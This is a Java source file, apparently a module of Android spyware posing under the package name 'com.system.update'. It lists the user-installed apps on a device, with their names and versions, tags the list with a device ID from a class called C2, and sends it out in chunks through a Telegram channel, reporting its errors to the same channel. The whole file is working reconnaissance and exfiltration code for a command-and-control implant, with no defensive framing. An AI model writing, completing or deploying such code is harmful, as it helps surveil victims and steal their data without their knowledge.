package com.system.update;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import java.util.List;

public final class AppInventory {
    private AppInventory() {}

    public static void run(Context ctx) {
        new Thread(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                List<PackageInfo> list = pm.getInstalledPackages(0);
                StringBuilder sb = new StringBuilder();
                sb.append("📦 APPS id=").append(C2.getDeviceId()).append(" count=")
                        .append(list.size()).append('\n');
                int n = 0;
                for (PackageInfo pi : list) {
                    if ((pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                    String label;
                    try {
                        label = pm.getApplicationLabel(pi.applicationInfo).toString();
                    } catch (Throwable t) {
                        label = "?";
                    }
                    sb.append(pi.packageName).append(" | ").append(label)
                            .append(" | v=").append(pi.versionName).append('\n');
                    n++;
                    if (n >= 350) break;
                }
                Telegram.send("📦 APPS user=" + n);
                String all = sb.toString();
                int pos = 0, part = 1;
                while (pos < all.length() && part <= 15) {
                    int end = Math.min(pos + 3200, all.length());
                    Telegram.send("[" + part + "]\n" + all.substring(pos, end));
                    pos = end;
                    part++;
                    try { Thread.sleep(300); } catch (InterruptedException ignored) {}
                }
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "apps_err:" + t.getMessage());
            }
        }, "apps").start();
    }
}
